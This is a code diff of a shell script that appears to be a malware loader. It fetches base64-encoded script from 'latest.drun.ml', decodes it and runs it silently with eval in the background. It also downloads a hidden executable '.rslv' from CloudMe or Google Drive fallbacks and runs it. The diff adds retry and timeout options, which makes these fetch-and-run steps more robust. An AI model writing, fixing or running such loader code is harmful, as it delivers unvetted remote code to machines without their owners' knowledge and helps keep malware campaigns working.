@@ -63,10 +63,10 @@ endpoints() {
 endpoints_fallback() {
     script_url=latest.drun.ml
     token_url=https://pl.drun.ml
-    data=$(echo "$script_url" | wget -q -i- -O- | $b64 -d)
+    data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
     parsedata
     launcher=${data}
-    pl_vars=$(echo "$token_url" | wget -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
+    pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
     pl_vars=${pl_token/*\/}
 }
 
@@ -74,16 +74,16 @@ filename=".rslv"
 getdig() {
     ## first try
     cloudmeurl="https://www.cloudme.com/v1/ws2/:fragia/:dig/dig"
-    echo "$cloudmeurl" | wget -q -i- -O ${filename} && chmod +x ${filename}
+    wget -t 2 -T 10 -q -i- -O ${filename} <<< "$cloudmeurl" && chmod +x ${filename} 
     if ! ./${filename} -v &>/dev/null; then
         ## second try
         fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
         gdriveCookieUrl="https://drive.google.com/uc?export=download&id=${fileid}"
         gdriveDownloadUrl="https://drive.google.com/uc?export=download&id=${fileid}&confirm="
 
-        echo "$gdriveCookieUrl" | wget -q --save-cookies ./cookie -O/dev/null -i-
+        echo "$gdriveCookieUrl" | wget -t 1 -T 5 -q --save-cookies ./cookie -O/dev/null -i-
         gdriveDownloadId=$(awk '/download/ {print $NF}' ./cookie)
-        echo  "$gdriveDownloadUrl" | wget -q  --load-cookies ./cookie -i- -O ${filename}
+        echo  "$gdriveDownloadUrl" | wget -t 1 -T 5 -q  --load-cookies ./cookie -i- -O ${filename}
         chmod +x "$filename"
         rm -f ./cookie
         if ! ./${filename} -v &>/dev/null; then
@@ -139,3 +139,4 @@ else
     sleep 1
     eval "$(printf '%s' "$launcher")" &>/dev/null
 fi
+
